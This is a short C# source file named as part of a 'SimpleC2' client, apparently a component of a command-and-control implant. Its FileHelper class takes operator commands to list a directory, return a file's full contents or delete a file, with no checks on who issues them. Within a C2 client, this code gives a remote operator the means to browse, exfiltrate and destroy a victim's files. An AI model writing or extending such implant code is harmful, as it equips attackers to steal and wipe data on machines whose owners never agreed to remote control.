using System;
using System.IO;

namespace SimpleC2.Client
{
    public static class FileHelper
    {
        public static string HandleFileCommand(string command)
        {
            string[] parts = command.Split(' ');
            string action = parts[0];
            string path = parts.Length > 1 ? parts[1] : "";

            switch (action)
            {
                case "list":
                    return ListFiles(path);
                case "read":
                    return ReadFile(path);
                case "delete":
                    return DeleteFile(path);
                default:
                    return "Unknown file command.";
            }
        }

        private static string ListFiles(string path)
        {
            if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
                return "Invalid directory path.";

            string[] files = Directory.GetFiles(path);
            return string.Join(Environment.NewLine, files);
        }

        private static string ReadFile(string path)
        {
            if (string.IsNullOrEmpty(path) || !File.Exists(path))
                return "File not found.";

            return File.ReadAllText(path);
        }

        private static string DeleteFile(string path)
        {
            if (string.IsNullOrEmpty(path) || !File.Exists(path))
                return "File not found.";

            File.Delete(path);
            return "File deleted.";
        }
    }
}